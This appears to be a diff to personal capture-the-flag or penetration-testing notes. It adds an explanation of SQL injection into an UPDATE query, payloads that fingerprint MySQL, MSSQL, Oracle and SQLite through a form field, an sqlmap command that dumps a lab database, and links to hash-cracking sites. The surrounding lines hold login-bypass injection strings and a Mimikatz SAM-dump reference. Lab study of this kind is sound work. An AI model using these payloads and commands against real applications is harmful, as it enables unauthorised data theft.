@@ -17,6 +17,7 @@ Useful Links:
 - https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/
 - https://github.com/ius/rsatool
 - https://github.com/RsaCtfTool/RsaCtfTool
+- https://gchq.github.io/CyberChef/ : Generate hashes using different methods
 
 ENUMERATION
 
@@ -38,6 +39,25 @@ Any login page found, try SQLi manually:
 - ' or 1=1/*
 - ') or '1'='1--
 - ') or ('1'='1-
+
+
+SQLi Snippet
+The first test confirmed that the application is vulnerable and that we have the correct column names. If we had the wrong column names, then non of the fields would have been updated. Since both fields are updated after injecting the malicious payload, the original SQL statement likely looks something similar to the following code:
+
+UPDATE <table_name> SET nickName='name', email='email' WHERE <condition>
+With this knowledge, we can try to identify what database is in use. There are a few ways to do this, but the easiest way is to ask the database to identify itself. The following queries can be used to identify MySQL, MSSQL, Oracle, and SQLite:
+
+# MySQL and MSSQL
+',nickName=@@version,email='
+# For Oracle
+',nickName=(SELECT banner FROM v$version),email='
+# For SQLite
+',nickName=sqlite_version(),email='
+  
+  
+  
+  
+  sqlmap -u http://10.10.221.175:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump
 
 
 
@@ -306,5 +326,8 @@ nt authority\system
   to grab Windows NTLM hashes, dump the SAM database with Mimikatz
   
   John the Ripper custom rules Wiki: https://www.openwall.com/john/doc/RULES.shtml
+  
+  https://hashes.com/en/decrypt/hash
+  https://crackstation.net/
   
   
